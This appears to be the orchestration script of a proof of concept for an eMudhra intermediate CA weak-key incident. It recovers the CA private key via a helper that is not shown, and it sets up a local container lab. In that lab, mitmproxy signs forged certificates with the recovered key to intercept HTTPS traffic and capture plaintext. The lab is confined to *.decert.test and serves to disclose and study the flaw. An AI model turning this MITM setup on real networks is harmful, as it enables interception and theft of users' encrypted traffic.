#!/usr/bin/env -S uv run --quiet --script
# /// script
# requires-python = ">=3.12"
# dependencies = []
# ///
"""decert — eMudhra 中间 CA 证书弱私钥事件 PoC。

    在本地还原私钥、伪造证书，并演示 HTTPS 中间人。

用法:
  ./decert.sh run        完整复现：生成证书 → 构建镜像 → 还原私钥 → 启动攻击面 → 跑矩阵
  ./decert.sh pki        只生成密钥与证书（lab/cas/）
  ./decert.sh build      只构建镜像（客户端 + 攻击者代理）
  ./decert.sh attack     只启动攻击面（真实站点 / 攻击者反代 / 正向代理）
  ./decert.sh test       只跑对照矩阵（需先 attack）
  ./decert.sh down       清理全部容器、网络与进程

真实站点、攻击者、客户端全部在本机或本地容器中运行，域名仅使用 *.decert.test。
"""
from __future__ import annotations

import os
import signal
import subprocess
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent
CAS = ROOT / "lab" / "cas"
EV = ROOT / "evidence"
NET = "decert"
SUBNET = "10.100.0.0/24"
DOMAIN = "decert.test"

CLIENTS = ["old", "new"]          # 旧信任库（含 emSign G3）/ 新信任库（已移除）
TRUST = {"old": "trust-old.pem", "new": "trust-new.pem"}
SCENARIOS = {                     # 场景 -> (客户端访问的域名, 目标 IP)
    "honest": (f"site.{DOMAIN}", "10.100.0.10"),
    "direct": (f"bank.{DOMAIN}", "10.100.0.20"),
    "proxy": (f"site.{DOMAIN}", "10.100.0.40"),
}

IMAGE = "localhost/decert-client"
PROXY_IMAGE = "localhost/decert-proxy"
MITM_KEY = ROOT / "lab" / "mitm" / "ca.key"

BANNER = "decert — eMudhra 中间 CA 证书弱私钥事件 PoC。"


def sh(*cmd, **kw) -> subprocess.CompletedProcess:
    return subprocess.run([str(c) for c in cmd], **kw)


def step(msg: str) -> None:
    print(f"\n== {msg}")


# ------------------------------------------------------------------ 各步骤
def cmd_pki() -> None:
    sh("uv", "run", ROOT / "lab" / "pki.py", check=True)


def cmd_build() -> None:
    sh("podman", "build", "-q", "-t", PROXY_IMAGE, "-f", ROOT / "images" / "proxy" / "Containerfile",
       ROOT / "images" / "proxy", check=True)
    print(f"  built {PROXY_IMAGE}")
    for tag in CLIENTS:
        sh("podman", "build", "-q", "-t", f"{IMAGE}:{tag}", "-f", ROOT / "images" / f"client-{tag}" / "Containerfile",
           ROOT / "images" / f"client-{tag}", check=True)
        print(f"  built {IMAGE}:{tag}")


def _cleanup_containers() -> None:
    for name in ("decert-site", "decert-reverse", "decert-proxy"):
        sh("podman", "rm", "-f", name, capture_output=True)


def cmd_attack() -> None:
    if not (CAS / "site.pem").exists():
        step("生成证书")
        cmd_pki()
    _cleanup_containers()
    sh("podman", "network", "rm", "-f", NET, capture_output=True)
    sh("podman", "network", "create", "--subnet", SUBNET, "--gateway", "10.100.0.1", NET,
       check=True, capture_output=True)

    def serve(name: str, ip: str, *args: str) -> None:
        sh("podman", "run", "-d", "--name", name, "--network", NET, "--ip", ip, "--hostname", ip,
           "--read-only", "--tmpfs", "/tmp:rw",
           "-v", f"{ROOT}:/lab:ro,Z", "-w", "/lab", f"{IMAGE}:old",
           "python3", "lab/site/serve.py", "--port", "8443", *args, check=True, capture_output=True)
        print(f"  {name:<14} {ip}:8443")

    serve("decert-site", "10.100.0.10", "--cert", "lab/cas/site.pem", "--key", "lab/cas/site.key",
          "--mode", "honest")
    serve("decert-reverse", "10.100.0.20", "--cert", "lab/cas/attacker-real.pem",
          "--key", "lab/cas/attacker-real.key", "--mode", "mitm",
          "--upstream", f"https://10.100.0.10:8443/site.{DOMAIN}")

    # 正向代理：与真实站点同处 decert 网络，才能解析 site.decert.test。
    # 它用泄露的中间 CA 作为自身 CA，现场为任意域名签发伪造证书。
    confdir = ROOT / "lab" / "mitm"
    confdir.mkdir(exist_ok=True)
    MITM_KEY.write_bytes((CAS / "weak-ca.key").read_bytes())
    (confdir / "mitmproxy-ca.pem").write_bytes(
        MITM_KEY.read_bytes() + (ROOT / "data" / "real-ca" / "em-ov-tls-ca-g3c.pem").read_bytes())
    EV.mkdir(exist_ok=True)
    (EV / "mitm-plaintext.txt").write_text("")
    log = open(EV / "mitm.log", "w")
    sh("podman", "rm", "-f", "decert-proxy", capture_output=True)
    sh("podman", "run", "-d", "--name", "decert-proxy", "--network", NET, "--ip", "10.100.0.40",
       "--add-host", f"site.{DOMAIN}:10.100.0.10",
       "-v", f"{ROOT}:/lab:ro,Z", "-v", f"{confdir}:/mitm:rw,Z", "-v", f"{EV}:/lab/evidence:rw,Z", "-w", "/lab",
       PROXY_IMAGE, "mitmdump",
       "--set", "confdir=/mitm", "--listen-host", "0.0.0.0", "--listen-port", "8080",
       "--set", "block_global=false", "--ssl-insecure", "--set", "connection_strategy=lazy",
       "-s", "/lab/lab/mitm/addon.py",
       stdout=log, stderr=log, check=True, text=True)
    print(f"  {'decert-proxy':<14} 10.100.0.40:8080")
    time.sleep(4)


def cmd_test(write_evidence: bool = True) -> list[tuple[str, str, str]]:
    rows = []
    for tag in CLIENTS:
        for scenario, (_host, ip) in SCENARIOS.items():
            cp = sh("podman", "run", "--rm", "--network", NET,
                    "-v", f"{ROOT}:/lab:ro,Z", "-w", "/lab", f"{IMAGE}:{tag}",
                    "python3", "lab/check.py", f"lab/cas/{TRUST[tag]}", scenario, ip,
                    capture_output=True, text=True)
            out = (cp.stdout or cp.stderr).strip()
            line = out.splitlines()[-1] if out else "无输出"
            rows.append((tag, scenario, line))
            print(f"  {tag:<4} {scenario:<7} {line}")
    if write_evidence:
        EV.mkdir(exist_ok=True)
        (EV / "matrix.txt").write_text("\n".join(f"{t:<4} {s:<7} {line}" for t, s, line in rows) + "\n")
        (EV / "matrix.md").write_text(
            "| 客户端 | 场景 | 结果 |\n|---|---|---|\n"
            + "\n".join(f"| {t} | {s} | {line.split('|', 2)[-1].strip()} |" for t, s, line in rows) + "\n")
    return rows


def cmd_run() -> None:
    step("1/5 生成证书")
    if not (CAS / "site.pem").exists():
        cmd_pki()
    else:
        print("  lab/cas/ 已存在，跳过（如需重新生成：make clean）")
    step("2/5 构建镜像")
    cmd_build()
    step("3/5 从公开证书还原私钥")
    EV.mkdir(exist_ok=True)
    shown = subprocess.run(["uv", "run", ROOT / "lab" / "pki.py", "--show"],
                           capture_output=True, text=True, cwd=ROOT)
    print(shown.stdout.rstrip())
    (EV / "recover.txt").write_text(shown.stdout)
    step("4/5 启动攻击面")
    cmd_attack()
    step("5/5 对照测试")
    cmd_test()
    captured = EV / "mitm-plaintext.txt"
    if captured.exists() and captured.read_text().strip():
        print("\n代理捕获的明文：")
        print(captured.read_text().rstrip())
    print("\n结果已写入 evidence/matrix.txt 与 evidence/matrix.md")


def cmd_down() -> None:
    _cleanup_containers()
    # 清理可能残留在宿主机的进程
    sh("pkill", "-f", "lab/site/serve.py", capture_output=True)
    sh("pkill", "-f", "mitmdump", capture_output=True)
    for pidf in (ROOT / ".proxy.pid",):
        if pidf.exists():
            try:
                os.kill(int(pidf.read_text()), signal.SIGTERM)
            except OSError:
                pass
            pidf.unlink()
    sh("podman", "network", "rm", "-f", NET, capture_output=True)
    print("已清理")


COMMANDS = {
    "run": (cmd_run, "完整复现：证书 → 镜像 → 私钥 → 攻击面 → 矩阵"),
    "pki": (cmd_pki, "只生成密钥与证书（lab/cas/）"),
    "build": (cmd_build, "只构建镜像"),
    "attack": (cmd_attack, "只启动攻击面"),
    "test": (cmd_test, "只跑对照矩阵（需先 attack）"),
    "down": (cmd_down, "清理容器、网络与进程"),
}


def usage() -> None:
    print(BANNER)
    print("\n用法: decert [命令]\n")
    for name, (_fn, desc) in COMMANDS.items():
        print(f"  {name:<8} {desc}")
    print("\n示例:\n  make run            # 一键跑完整流程\n  ./decert.sh attack  # 仅启动攻击面")


def main() -> None:
    args = sys.argv[1:]
    if not args or args[0] in ("-h", "--help", "help"):
        usage()
        return
    cmd = args[0]
    if cmd not in COMMANDS:
        print(f"未知命令: {cmd}\n", file=sys.stderr)
        usage()
        sys.exit(1)
    COMMANDS[cmd][0]()


if __name__ == "__main__":
    main()
